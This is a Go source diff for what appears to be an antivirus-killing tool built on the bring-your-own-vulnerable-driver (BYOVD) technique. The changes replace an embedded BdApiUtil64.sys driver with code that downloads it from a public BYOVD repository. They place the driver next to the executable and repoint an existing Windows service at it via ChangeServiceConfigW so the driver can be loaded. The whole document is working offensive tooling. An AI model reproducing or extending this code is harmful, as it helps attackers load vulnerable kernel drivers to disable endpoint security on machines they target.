@@ -13,11 +13,10 @@ import (
 	"unsafe"
 	"github.com/carved4/go-wincall"
 	"avk/pkg/kernel"
+	"avk/pkg/net"
 	"runtime/debug"
 )
 
-//go:embed BdApiUtil64.sys
-var embeddedDriver []byte
 
 
 const (
@@ -28,6 +27,7 @@ const (
 	SERVICE_ERROR_NORMAL      = 0x00000001
 	SERVICE_CONTROL_STOP      = 0x00000001
 	SERVICE_STOPPED           = 0x00000001
+	SERVICE_NO_CHANGE         = 0xFFFFFFFF
 	OPEN_EXISTING             = 3
 	GENERIC_READ              = 0x80000000
 	GENERIC_WRITE             = 0x40000000
@@ -61,17 +61,28 @@ func UTF16ToString(s []uint16) string {
 }
 
 
-func extractDriver() error {
-	driverPath := "BdApiUtil64.sys"
-	if _, err := os.Stat(driverPath); err == nil {
-		fmt.Println("[-] driver file already exists, skipping extraction")
-		return nil
-	}
-	err := os.WriteFile(driverPath, embeddedDriver, 0644)
+func getDriverPath() (string, error) {
+	exePath, err := os.Executable()
 	if err != nil {
-		return fmt.Errorf("failed to extract driver: %v", err)
+		return "", err
 	}
-	return nil
+	exeDir := filepath.Dir(exePath)
+	return filepath.Join(exeDir, "BdApiUtil64.sys"), nil
+}
+
+
+func DownloadAndExtractDriver() error {
+	driverURL := "https://github.com/BlackSnufkin/BYOVD/raw/refs/heads/main/BdApiUtil-Killer/BdApiUtil64.sys"
+	buff, err := net.DownloadToMemory(driverURL)
+	if err != nil {
+		return err
+	}
+
+	path, err := getDriverPath()
+	if err != nil {
+		return err
+	}
+	return os.WriteFile(path, buff, 0644)
 }
 
 
@@ -577,6 +588,33 @@ func NewBYOVD(config DriverConfig) (*BYOVD, error) {
 			wincall.Call("advapi32.dll", "CloseServiceHandle", scManager)
 			return nil, fmt.Errorf("failed to create service: %v", err)
 		}
+	} else {
+		// Service exists; make sure its ImagePath points to our current extracted driver
+		driverPath, derr := getDriverPath()
+		if derr == nil {
+			binaryPath, _ := wincall.UTF16PtrFromString(driverPath)
+			// BOOL ChangeServiceConfigW(
+			//   SC_HANDLE hService,
+			//   DWORD dwServiceType,
+			//   DWORD dwStartType,
+			//   DWORD dwErrorControl,
+			//   LPCWSTR lpBinaryPathName,
+			//   LPCWSTR lpLoadOrderGroup,
+			//   LPDWORD lpdwTagId,
+			//   LPCWSTR lpDependencies,
+			//   LPCWSTR lpServiceStartName,
+			//   LPCWSTR lpPassword,
+			//   LPCWSTR lpDisplayName
+			// )
+			Call("advapi32.dll", "ChangeServiceConfigW",
+				service,
+				SERVICE_NO_CHANGE,
+				SERVICE_NO_CHANGE,
+				SERVICE_NO_CHANGE,
+				uintptr(unsafe.Pointer(binaryPath)),
+				0, 0, 0, 0, 0, 0,
+			)
+		}
 	}
 	byovd.service = service
 	return byovd, nil
@@ -584,18 +622,15 @@ func NewBYOVD(config DriverConfig) (*BYOVD, error) {
 
 
 func (b *BYOVD) createService() (uintptr, error) {
-	currentDir, err := os.Getwd()
+	driverPath, err := getDriverPath()
 	if err != nil {
-		return 0, fmt.Errorf("failed to get current directory: %v", err)
+		return 0, fmt.Errorf("failed to get driver path: %v", err)
 	}
 
-	driverPath := filepath.Join(currentDir, "BdApiUtil64.sys")
-	
 	if _, err := os.Stat(driverPath); os.IsNotExist(err) {
 		return 0, fmt.Errorf("driver file not found: %s (extraction may have failed)", driverPath)
 	}
 
-	
 	serviceName, _ := wincall.UTF16PtrFromString(b.config.Name)
 	serviceDisplayName, _ := wincall.UTF16PtrFromString(b.config.Name)
 	binaryPath, _ := wincall.UTF16PtrFromString(driverPath)
@@ -740,10 +775,10 @@ func main() {
    ░       ░  ░     ░  ░   ░             ░  ░   ░  
  ░                       ░                     ░   `)
 	debug.SetGCPercent(-1)
-	if err := extractDriver(); err != nil {
+	if err := DownloadAndExtractDriver(); err != nil {
 		log.Fatalf("failed to extract driver: %v", err)
 	}
-	
+	time.Sleep(3 * time.Second)
 	driver, err := NewBYOVD(BdApiUtilDriver)
 	if err != nil {
 		log.Fatalf("failed to initialize driver: %v", err)
